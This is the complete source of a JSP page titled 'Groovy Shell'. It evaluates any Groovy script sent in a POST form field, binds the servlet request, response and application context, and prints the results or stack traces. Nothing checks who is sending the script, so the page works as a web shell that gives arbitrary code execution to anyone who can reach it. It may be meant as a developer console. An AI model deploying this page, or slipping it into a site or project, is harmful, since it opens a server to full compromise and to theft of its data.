<%@ page import="groovy.lang.GroovyShell" %>
<%@ page import="groovy.lang.Closure" %>
<%@ page import="org.codehaus.groovy.runtime.GroovyCategorySupport" %>
<%@ page import="groovy.servlet.ServletCategory" %>
<%@ page import="groovy.servlet.ServletBinding" %>
<%@ page import="java.io.StringWriter" %>
<%@ page import="java.io.PrintWriter" %>
<%@ page contentType="text/html;charset=UTF-8" language="java" %>
<%!
    String toHtml(Object o) {
        if (o == null) {
            return "";
        }
        return o.toString().replace("<", "&lt;").replace(">", "&gt;").replace("\"","&quot;");
    }
%>
<%
Object result = null;
Exception error = null;
final String script = request.getParameter("script");
if (request.getMethod().equalsIgnoreCase("POST")) {
    try {
        final ServletBinding binding = new ServletBinding(request, response, application);

        final GroovyShell shell = new GroovyShell(binding);
        Closure closure = new Closure(shell) {

            public Object call() {
                return ((GroovyShell)getDelegate()).evaluate(script);
            }

        };
        result = GroovyCategorySupport.use(ServletCategory.class, closure);
    } catch (Exception e) {
        error = e;
    }
}
%>
<html>
<head>
    <title>Groovy Shell</title>
</head>
<body>
    <%
        if (result != null) {
    %><pre><%= toHtml(result) %></pre><%
        }
    %>
    <%
        if (error != null) {
            StringWriter writer = new StringWriter();
            error.printStackTrace(new PrintWriter(writer, true));
    %><pre style="color: #730000"><%= toHtml(writer) %></pre><%
        }
    %>
    <form method="post">
        <input type="submit" value="Evaluate"/>
        <br/>
        <label>
            <br/>
            <textarea name="script" cols="120" rows="25"><%=toHtml(script)%></textarea>
        </label>
    </form>
</body>
</html>
